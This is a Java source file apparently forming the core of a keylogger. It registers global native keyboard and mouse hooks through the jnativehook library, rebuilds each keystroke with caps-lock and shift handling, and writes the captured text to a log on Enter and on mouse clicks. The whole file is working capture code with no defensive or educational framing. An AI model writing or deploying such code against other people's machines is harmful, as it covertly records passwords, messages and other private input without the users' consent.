package main;

import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.util.Date;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;

public class GlobalKeyListener implements NativeKeyListener, NativeMouseInputListener
{
	private StringBuilder	buffer;
	private boolean			capsReverse;	//shift
											
	public GlobalKeyListener()
	{
		capsReverse = false;
		buffer = new StringBuilder();
		buffer.append("<logger start> <" + new Date().toString() + ">");
		logg();
	}
	
	private void logg()
	{
		Utils.logg(buffer.toString());
		buffer.setLength(0);// clean buffer
	}
	
	private void loggParser(NativeKeyEvent e)
	{
		String s = NativeKeyEvent.getKeyText(e.getKeyCode());
		if(s.length() == 1)
		{
			buffer.append(convertCharToMinMaj(s.charAt(0)));
		}
		else
		{
			
			buffer.append(keyNameToKeyChar(s));
		}
	}
	
	private char convertCharToMinMaj(char c)
	{
		if((getCapsLockState() && !capsReverse) || (!getCapsLockState() && capsReverse))
			return Character.toUpperCase(c);
		else
			return Character.toLowerCase(c);
	}
	
	private String keyNameToKeyChar(String keyName)
	{
		keyName = keyName.toUpperCase();
		if(Constants.KEYNAME_CHAR.containsKey(keyName))
			return Character.toString(convertCharToMinMaj(Constants.KEYNAME_CHAR.get(keyName.toUpperCase())));
		else
			return "<" + keyName + ">";
	}
	
	private boolean getCapsLockState()
	{
		return Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPS_LOCK);
	}
	
	public void nativeKeyPressed(NativeKeyEvent e)
	{
		switch(e.getKeyCode())
		{
			case 10: //enter
				logg();
			break;
			case 16://shift
				capsReverse = true;
			break;
			case 20://MAJ
				//--
			break;
			default:
				loggParser(e);
			break;
		}
	}
	
	public void nativeKeyReleased(NativeKeyEvent e)
	{
		if(e.getKeyCode() == 16)
			capsReverse = false;
	}
	
	public void nativeKeyTyped(NativeKeyEvent e)
	{
		//--
	}
	
	public void nativeMouseClicked(NativeMouseEvent e)
	{
		//--
	}
	
	public void nativeMousePressed(NativeMouseEvent e)
	{
		buffer.append("<mouse pressed>");
		logg();
	}
	
	public void nativeMouseReleased(NativeMouseEvent e)
	{
		//--
	}
	
	public void nativeMouseMoved(NativeMouseEvent e)
	{
		//--
	}
	
	public void nativeMouseDragged(NativeMouseEvent e)
	{
		//--
	}
	
	public static void main()
	{
		try
		{
			GlobalScreen.registerNativeHook();
		}
		catch(NativeHookException ex)
		{
			System.err.println("There was a problem registering the native hook.");
			System.err.println(ex.getMessage());
			
			System.exit(1);
		}
		
		GlobalKeyListener gkl = new GlobalKeyListener();
		GlobalScreen.getInstance().addNativeKeyListener(gkl);
		GlobalScreen.getInstance().addNativeMouseListener(gkl);
	}
}